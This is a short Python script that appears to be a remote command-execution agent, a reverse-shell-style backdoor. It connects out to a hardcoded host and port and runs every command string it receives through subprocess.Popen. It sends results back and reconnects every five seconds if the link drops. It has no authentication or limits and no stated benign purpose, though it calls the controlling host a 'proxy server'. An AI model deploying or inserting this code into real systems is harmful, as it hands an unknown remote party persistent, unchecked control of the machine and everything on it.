import socket
import subprocess
import time
def start_client(server_ip, server_port):
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((server_ip, server_port))
                print(f"Connected to the proxy server at {server_ip}:{server_port}")

                while True:
                    command = s.recv(1024).decode('utf-8')
                    if command:
                        try:
                            print(f"Received command: {command}")
                            # Execute the command in a new console window
                            subprocess.Popen(command, creationflags=subprocess.CREATE_NEW_CONSOLE)
                            s.sendall(b"Process started successfully")
                        except Exception as e:
                            s.sendall(f"Error: {str(e)}".encode('utf-8'))
        except Exception as e:
            print(f"Connection failed: {e}. Retrying in 5 seconds...")
            time.sleep(5)
            continue

if __name__ == "__main__":
    server_ip = "192.168.1.65"  # Replace with your proxy server's IP address
    server_port = 9999          # Replace with your proxy server's port
    start_client(server_ip, server_port)
